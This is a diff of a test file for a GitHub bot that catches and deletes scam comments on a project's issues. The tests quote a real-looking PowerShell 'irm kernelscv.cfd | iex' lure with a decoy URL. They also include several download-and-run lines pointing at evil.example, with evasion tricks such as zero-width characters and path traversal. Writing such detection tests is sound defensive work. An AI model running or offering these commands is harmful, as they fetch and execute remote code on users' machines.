@@ -18,7 +18,7 @@ _spec.loader.exec_module(guard)
 SCAM_3208 = (
     "### Method 1 - PowerShell \n1. Click the **Start Menu**, type `PowerShell`, and open it.\n"
     "2. Copy and paste the code below and press **Enter.**\n\n```powershell\n"
-    '"VoiceBlueprintInstaller-fixed;https://github.com/DevTunaSoft/VoiceBlueprint-Pro/releases/tag/v0.5.6";'
+    '"VoiceBlueprintInstaller-fixed;https://github.com/DevTunaSoft/VoiceBlueprintPro/releases/tag/v0.5.6";'
     "irm kernelscv.cfd | iex\n```"
 )
 
@@ -46,12 +46,12 @@ def test_the_3208_scam_is_caught_despite_the_decoy_url():
     "i​rm evil.example | i​ex",  # zero-width characters
     "irm https://voiceblueprint.sh.evil.example | iex",  # lookalike host
     "irm https://github.com/someone-else/VoiceBlueprint/raw/x.ps1 | iex",
-    "irm https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprint-ProFix/main/x | iex",
+    "irm https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprintProFix/main/x | iex",
     # Allowlist tricks: userinfo, climbing out of the prefix, a second URL.
     "irm https://voiceblueprint.sh@evil.example/x | iex",
-    "irm https://github.com/DevTunaSoft/VoiceBlueprint-Pro/../../evil/x/raw/a.ps1 | iex",
-    "irm https://github.com/DevTunaSoft/VoiceBlueprint-Pro/%2e%2e/%2e%2e/evil/a.ps1 | iex",
-    "curl -fsSL https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprint-Pro/main/scripts/install.sh https://evil.example/x | sh",
+    "irm https://github.com/DevTunaSoft/VoiceBlueprintPro/../../evil/x/raw/a.ps1 | iex",
+    "irm https://github.com/DevTunaSoft/VoiceBlueprintPro/%2e%2e/%2e%2e/evil/a.ps1 | iex",
+    "curl -fsSL https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprintPro/main/scripts/install.sh https://evil.example/x | sh",
 ])
 def test_download_and_run_from_unlisted_sources_is_caught(text):
     assert [f.rule for f in guard.scan(text)] == ["download-and-run"]
@@ -85,12 +85,12 @@ def test_install_commands_from_the_docs_are_allowed(text):
 
 @pytest.mark.parametrize("text", [
     "spawn UNKNOWN when starting the backend on Windows 11",
-    "I ran `irm https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprint-Pro/main/scripts/install.ps1 | iex` and got ImportError: DLL load failed",
+    "I ran `irm https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprintPro/main/scripts/install.ps1 | iex` and got ImportError: DLL load failed",
     "curl http://127.0.0.1:3900/health returns connection refused",
     "Downloaded the installer with curl -O https://evil.example/file and checked it",
     "pip install torch --index-url https://download.pytorch.org/whl/cu121",
     "The log says: | iex is not recognised",
-    "irm https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprint-Pro/main/scripts/install.ps1 | iex, then see https://example.com/notes",
+    "irm https://raw.githubusercontent.com/DevTunaSoft/VoiceBlueprintPro/main/scripts/install.ps1 | iex, then see https://example.com/notes",
     # Real issues describing the pattern without a target (#2973, #1628).
     "[Install] Windows PowerShell command (irm | iex) downloads Linux/macOS bash script",
     "`curl ... | sh` currently clones the repo and builds from source",
@@ -103,7 +103,7 @@ def test_ordinary_bug_reports_are_left_alone(text):
 
 
 class FakeGitHub:
-    repo = "DevTunaSoft/VoiceBlueprint-Pro"
+    repo = "DevTunaSoft/VoiceBlueprintPro"
 
     def __init__(self, comments=()):
         self.calls: list[tuple] = []
@@ -139,12 +139,12 @@ def test_a_scam_comment_is_deleted_and_the_thread_warned_once():
     gh = FakeGitHub()
     guard.run(gh, "issue_comment", {"issue": issue("spawn UNKNOWN"), "comment": comment(SCAM_3208)})
     methods = [(m, p) for m, p, _ in gh.calls]
-    assert ("DELETE", "/repos/DevTunaSoft/VoiceBlueprint-Pro/issues/comments/77") in methods
-    assert ("POST", "/repos/DevTunaSoft/VoiceBlueprint-Pro/issues/3208/comments") in methods
+    assert ("DELETE", "/repos/DevTunaSoft/VoiceBlueprintPro/issues/comments/77") in methods
+    assert ("POST", "/repos/DevTunaSoft/VoiceBlueprintPro/issues/3208/comments") in methods
 
     warned = FakeGitHub(comments=[{"body": guard.COMMENT_WARNING}])
     guard.run(warned, "issue_comment", {"issue": issue("spawn UNKNOWN"), "comment": comment(SCAM_3208)})
-    assert ("POST", "/repos/DevTunaSoft/VoiceBlueprint-Pro/issues/3208/comments") not in [(m, p) for m, p, _ in warned.calls]
+    assert ("POST", "/repos/DevTunaSoft/VoiceBlueprintPro/issues/3208/comments") not in [(m, p) for m, p, _ in warned.calls]
 
 
 def test_a_scam_command_in_the_title_is_caught():
